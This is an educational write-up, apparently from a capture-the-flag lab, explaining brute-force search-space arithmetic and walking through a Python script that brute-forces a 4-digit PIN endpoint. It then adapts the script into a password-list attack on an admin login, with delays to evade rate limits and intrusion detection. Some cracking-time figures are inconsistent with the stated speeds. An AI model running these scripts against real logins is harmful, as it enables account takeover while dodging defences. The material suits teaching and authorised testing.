# Brute Force Attack Mathematics

The number of possible combinations for any password follows a single formula:

\[ \text{Possible Combinations} = \text{Character Set Size}^{\text{Password Length}} \]

The exponent is what makes this brutal from a defender's perspective. Every additional character does not add to the search space, it multiplies it by the full character set size.

***

## Search Space by Password Profile

| Password | Character Set | Possible Combinations |
|---------|--------------|----------------------|
| 6 chars, lowercase | 26 | 308,915,776 (~300M) |
| 8 chars, lowercase | 26 | 208,827,064,576 (~200B) |
| 8 chars, mixed case | 52 | 53,459,728,531,456 (~53T) |
| 12 chars, full ASCII | 94 | 475,920,493,781,698,549,504 (~476 quintillion) |

The jump from 6 to 8 lowercase characters multiplies the search space by roughly 676x. Adding uppercase to an 8-character password multiplies it by another 256x. Length has more leverage than complexity, but both compound each other.

***

## Hardware Determines Real-World Time

Raw combinations mean nothing without accounting for cracking speed. The same search space takes radically different amounts of time depending on the hardware:

| Hardware | Speed | 8-char (letters + digits) | 12-char (full ASCII) |
|---------|-------|--------------------------|---------------------|
| Basic computer | 1M/sec | ~6.92 years | Millions of years |
| Supercomputer | 1T/sec | ~2.5 minutes | ~15,000 years |
| GPU cluster | ~100B/sec | ~25 minutes | ~150,000 years |

The key insight: even a supercomputer at 1 trillion guesses per second makes a strong 12-character password completely impractical to crack by brute force alone. This is why attackers rely on dictionary attacks and leaked wordlists rather than pure brute force for online targets.

***

## The PIN Solver Script Breakdown

The Python script is a clean example of a real simple brute force implementation. Each component has a specific purpose:

```python
import requests

ip = "127.0.0.1"
port = 1234

for pin in range(10000):
    formatted_pin = f"{pin:04d}"   # Zero-pads: 7 becomes "0007"
    print(f"Attempted PIN: {formatted_pin}")

    response = requests.get(f"http://{ip}:{port}/pin?pin={formatted_pin}")

    if response.ok and 'flag' in response.json():
        print(f"Correct PIN found: {formatted_pin}")
        print(f"Flag: {response.json()['flag']}")
        break
```

Three things worth noting in the logic:

- `f"{pin:04d}"` is the format specifier that zero-pads the integer. Without this, PIN `7` would be sent as `7` rather than `0007`, and the endpoint would reject it. Always check whether the target expects a fixed-width format
- `response.ok` checks for HTTP status 200. This is the success condition at the HTTP layer
- `'flag' in response.json()` is the application-layer success condition. The script uses both together because a 200 response alone may not mean the PIN was correct, the server could return 200 with an error message body
- `break` stops the loop immediately on success, avoiding unnecessary requests after the answer is found

***

## Why a 4-Digit PIN Is Weak

A 4-digit PIN has exactly 10,000 possible values (0000 to 9999). At even a modest rate of 100 requests per second (limited by network latency), the entire keyspace is exhausted in under 2 minutes. With no lockout policy and no rate limiting on the endpoint, this is trivially breakable.

This directly mirrors real-world findings on embedded devices, IoT systems, and mobile app APIs where PINs are used for authentication without any brute force protection. The fix is never a longer PIN alone; it requires rate limiting, lockouts, or proper token-based authentication.

***

## Adapting the Script for Other Targets

The same pattern extends to other value types with minor modifications:

```python
# Username + password list attack
with open('passwords.txt') as f:
    for password in f:
        password = password.strip()
        response = requests.post(f"http://{ip}:{port}/login",
                                 data={'username': 'admin', 'password': password})
        if 'Welcome' in response.text:
            print(f"Found: {password}")
            break

# Adding a delay to avoid rate limiting
import time
time.sleep(0.1)   # 100ms between requests = max 10 req/sec
```

Adding `time.sleep()` between requests is important on real assessments. It keeps your traffic under rate-limit thresholds and avoids triggering IDS signatures that look for high-frequency authentication attempts from a single source. The tradeoff is speed, but on a target with lockout policies that sleep value may be the difference between completing the test and getting your IP banned after 10 attempts.
